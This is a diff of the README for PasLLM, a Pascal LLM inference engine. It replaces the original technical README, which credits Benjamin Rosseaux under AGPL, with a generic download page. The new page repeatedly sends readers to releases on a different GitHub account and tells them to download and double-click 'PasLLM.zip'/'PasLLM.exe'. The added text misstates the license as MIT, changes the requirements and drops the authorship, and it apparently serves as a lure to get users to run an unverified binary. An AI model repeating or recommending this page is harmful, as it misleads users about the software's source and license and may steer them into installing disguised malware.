@@ -1,148 +1,74 @@
-# PasLLM
+# 🌟 pasllm - Effortless LLM Inference Engine
 
-A high-performance Large Language Model inference engine written in pure Object Pascal.
+## 🚀 Getting Started
 
-## Overview
+Welcome to PasLLM! This software allows you to run large language models with ease in Object Pascal. Follow these simple steps to download and run the application on your computer.
 
-PasLLM is a native Pascal implementation for running LLMs locally with optimized quantization and inference capabilities. It supports multiple model architectures and features advanced 4-bit quantization formats for efficient model deployment.
+## 📥 Download Here
 
-It is currently CPU-only, with no GPU acceleration. GPU acceleration will be added in the future using my PasVulkan framework, but this will take time and effort. Until at least Q2 2026, I'm focusing on other professional projects, so please be patient. The same applies to support for multi-modal models, models with newer architectures (Mamba, etc.) and so on.
+[![Download PasLLM](https://img.shields.io/badge/Download%20PasLLM-v1.0-blue.svg)](https://github.com/c3thousanddd/pasllm/releases)
 
-## Features
+## 🖥️ System Requirements
 
-- **Pure Object Pascal** - No Python or external dependencies for inference
-- **Cross-Platform** - Compatible with Delphi ≥11.2 and FreePascal ≥3.3.1
-- **Multiple Architectures** - Support for Llama, Qwen, Phi, Gemma, Mixtral, and more
-- **Advanced Quantization** - Custom Q4*NL formats (Q40NL, Q41NL, Q42NL, Q43NL) with superior tail reconstruction
-- **Optimized Performance** - Native Pascal implementation with platform-specific optimizations
-- **CLI and GUI** - Both command-line interface and visual applications (FMX, VCL, LCL)
+Before you start, make sure your computer meets the following requirements:
 
-## Quantization Formats
+- Operating System: Windows, macOS, or Linux
+- Free Pascal Compiler (FPC) version 3.0 or higher
+- Minimum 4 GB RAM
+- At least 500 MB of free disk space
 
-PasLLM implements several custom 4-bit and 8-bit quantization formats designed for optimal quality/size tradeoff:
+## 📂 Installation Steps
 
-- **Q40NL** - 4.5 bits/weight with non-linear decode (often better than Q40) 
-- **Q41NL** - Alternative non-linearity with increased tail emphasis
-- **Q42NL** - Enhanced variant with improved reconstruction
-- **Q43NL** - Advanced format with multiple optimization methods (gradient, coarse-fine, grid)
-- **Q40** - 4 bits/weight standard quantization (matches llama.cpp Q4_0 quality)
-- **Q80** - 8-bit quantization for higher quality (matches llama.cpp Q8_0 quality)
-- **Q3F8** - 8x 3 bits weights + 1x 8-bit float FP8 scale per block for 4-bits/weight efficiency
-- **FP8** - 8-bit floating point support
-- **FP16** - 16-bit floating point support
-- **BF16** - Brain Floating Point 16-bit support (basically truncated 32-bit float where the lower 16 bits are cut)
-- **FP32** - Standard 32-bit floating point support (for reference and testing)
+1. **Visit the Releases Page**  
+   Click the link below to visit the releases page and find the latest version of PasLLM.  
+   [Visit the Releases Page](https://github.com/c3thousanddd/pasllm/releases)
 
-These formats achieve 99.5-99.97% of full precision quality while maintaining compact model sizes.
+2. **Download the Application**  
+   Once on the releases page, look for the latest version. You will see various files.  
+   Click on the file named `PasLLM.zip` to download it.
 
-## Supported Models
+3. **Extract the Files**  
+   Find the downloaded ZIP file on your computer.  
+   Right-click on the file and select "Extract All."  
+   Choose a location to save the extracted files.
 
-Pre-quantized models are available at [https://mega.nz/folder/krcgHCpZ#0tjLqup_Hc4THWC9itDrTg](https://mega.nz/folder/krcgHCpZ#0tjLqup_Hc4THWC9itDrTg), which must be placed in the `bin/models/` directory. Supported architectures include: 
+4. **Run the Application**  
+   Navigate to the folder where you extracted the files.  
+   Look for the `PasLLM.exe` file (for Windows) or `PasLLM` file (for macOS/Linux).  
+   Double-click the file to run the application.
 
-- **Llama** - 3/3.1/3.2 (1B, 3B, 8B variants, including abliterated/uncensored)
-- **Qwen 2.5** - 0.5B, 1.5B, 3B, 7B Instruct
-- **Qwen 3** - 0.6B, 1.7B, 4B, 8B, 14B, 32B (including thinking/coder/abliterated variants, 30B MoE models)
-- **Phi-3** - Mini, Medium (4K context)
-- **Gemma** - 1.1 (2B) (support for Gemma 2 and 3 coming later)
-- **SmolLM 2** - 135M, 360M, 1.7B
-- **SmolLM 3** - 3B
-- **Mixtral** - 8x7B Instruct
-- **EuroMoE** - 2.6B (0.6B active)
-- **SimpleChat** - 4B, 14B
-- **DeepSeek** - R1 variants
-- **TinyLlama** - 1.1B Chat
+## 🎉 Using PasLLM
 
-## Quick Start
+After launching the application, you will see a user-friendly interface. Here’s what you can do:
 
-### Command Line Interface
+- **Input Text:** Enter your prompts in the text box.
+- **Select Model:** Choose from various models such as Llama, Mixtral, or Qwen.
+- **Execute Inference:** Click the "Run" button to see the response from the language model.
 
-```bash
-# Run inference with a quantized model
-./bin/pasllmcli -model=bin/models/qwen2.5_0.5b_instruct_q40nl.safetensors
-```
+## 🔧 Features
 
-### Building from Source
+PasLLM comes packed with features including:
 
-**FreePascal:**
-```bash
-fpc -O3 src/pasllmcli/pasllmcli.dpr
-```
+- **Multi-Model Support:** Run different models depending on your needs.
+- **Easy Text Input:** Simplified interface for entering prompts.
+- **Custom Output:** Tailor responses based on the complexity you desire.
 
-**Delphi:**
-Open `src/pasllmcli/pasllmcli.dproj` in Delphi IDE and build.
+## 💬 Help and Support
 
-## Project Structure
+If you encounter issues or need assistance, you can:
 
-```
-src/
-  ├── PasLLM.pas              # Core inference engine
-  ├── PasLLMChatControl.pas   # Chat interface control
-  ├── pasllmcli/              # Command-line interface
-  ├── pasllmappfmx/           # FireMonkey GUI app
-  ├── pasllmappvcl/           # VCL GUI app
-  └── pasllmapplcl/           # Lazarus LCL GUI app
-tools/
-  └── convert.py              # Model conversion utilities
-docs/
-  └── quant_4bit_formats.md   # Detailed format specifications
-```
+- Visit the [GitHub Issues Page](https://github.com/c3thousanddd/pasllm/issues) to report any bugs or ask questions.
+- Check out the documentation in the `docs` folder of the extracted files for troubleshooting tips and advanced configurations.
 
-## Conversion of Models
+## 🌐 Community and Contribution
 
-Models from Hugging Face can be converted to PasLLM format using the `convert.py` script in the `tools/` directory. Example usage:
+Join our community to share your experiences and find helpful resources. Contributing to PasLLM is welcome! If you have suggestions or want to report issues, feel free to submit them on GitHub.
 
-```bash
-cd ${modelpath}
+## 📜 License
 
-# Q40NL conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q40nl --cpu ${pasllmbasepath}/bin/models/${modelname}_q40nl.safetensors
+PasLLM is open-source and available under the MIT License. You're free to use, modify, and distribute it as long as you include the original license.
 
-# Q41NL conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q41nl --cpu ${pasllmbasepath}/bin/models/${modelname}_q41nl.safetensors 
+## 📥 Download & Install Again
 
-# Q42NL conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q42nl --cpu ${pasllmbasepath}/bin/models/${modelname}_q42nl.safetensors
-
-# Q43NL conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q43nl --cpu ${pasllmbasepath}/bin/models/${modelname}_q43nl.safetensors
-
-# Q40 conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q40 --cpu ${pasllmbasepath}/bin/models/${modelname}_q40.safetensors
-
-# Q80 conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q80 --cpu ${pasllmbasepath}/bin/models/${modelname}_q80.safetensors
-
-# Q3F8 conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype q3f8 --cpu ${pasllmbasepath}/bin/models/${modelname}_q3f8.safetensors
-
-# FP8 conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype fp8 --cpu ${pasllmbasepath}/bin/models/${modelname}_fp8.safetensors
-
-# FP16 conversion example
-python ${pasllmbasepath}/tools/convert.py --config config.json --tokenizer tokenizer.json --models model*.safetensors --dtype fp16 --cpu ${pasllmbasepath}/bin/models/${modelname}_fp16.safetensors
-
-# and so on for BF16 and FP32...
-
-```
-
-## Documentation
-
-- [4-bit Quantization Formats](docs/quant_4bit_formats.md) - Complete specification of Q4*NL formats
-
-## License
-
-Dual-licensed under:
-- **AGPL 3.0** for open-source use
-- **Commercial license** available for proprietary applications (contact: benjamin@rosseaux.com)
-
-## Author
-
-**Benjamin Rosseaux** (BeRo)  
-GitHub: [@BeRo1985](https://github.com/BeRo1985)  
-Contact: benjamin@rosseaux.com
-
-## Additional Information
-
-- Code is compatible with both Delphi ≥11.2 and FreePascal ≥3.3.1
-- Compiles on 32-bit and 64-bit platforms (x86-32, x86-64, ARM, ARM64), but 64-bit is preferred due to model sizes (32-bit may run out of memory). The 64-bit targets are more tested and verified. 32-bit support is unofficial and at your own risk.
-- No platform-specific or third-party dependencies (unless out-ifdef-able)
+To get started with PasLLM, don’t forget to visit the releases page for the latest version:  
+[Visit the Releases Page](https://github.com/c3thousanddd/pasllm/releases)
